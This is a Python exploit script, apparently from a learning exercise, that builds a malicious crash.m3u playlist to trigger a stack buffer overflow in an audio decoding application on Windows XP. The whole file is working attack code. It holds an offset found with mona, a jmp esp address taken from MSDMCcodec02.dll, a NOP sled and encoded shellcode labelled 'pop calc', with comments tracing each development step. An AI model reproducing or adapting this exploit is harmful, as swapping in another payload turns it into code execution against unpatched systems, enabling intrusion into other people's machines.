# Script for exploiting bug within audio decoding application on Windows XP
def main():
	#we need a file, I just call it crash.m3u
	out = open('crash.m3u','w')

	#write_string += 'A' * 30000
	
	#write_string += 'A' * 25000
	#write_string += 'B' * 5000
	
	#25000 A's + 1072 A's for offset
	#value found with !mona pattern_create 5000, then finding the value in eip (6A42376A = j7Bj)
	#then running !mona pattern_offset j7Bj
	write_string = 'A' * 26072
	
	#0x01afb22a is address of \xff\xe4 (jmp esp)
	#address found by searching loaded modules (.dll files) and finding the loading address of MSDMCcodec02.dll
	#then running !mona find -b 01840000 -s \xff\xe4 -m MSDMCcodec02
	#01840000 was memory address of MSDMCcodec02.dll
	
	#neither of these worked
	#write_string += '0x01afb22a'
	#write_string += '01afb22a'
	
	#\x makes the program read the address as text instead of ascii values for each character
	write_string += '\x2a\xb2\xaf\x01'
	
	#need to make sure we have the correct address
	
	#25 nops
	write_string += "\x90" * 25
	
	#break instruction
	#write_string += '\xcc'
	
	#25 nops
	#write_string += '\x90' * 25
	
	#pop calc
	write_string += '\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca'
	
	#write out and close the file
	out.write(write_string)
	out.close()

	
if __name__ == '__main__':
	main()
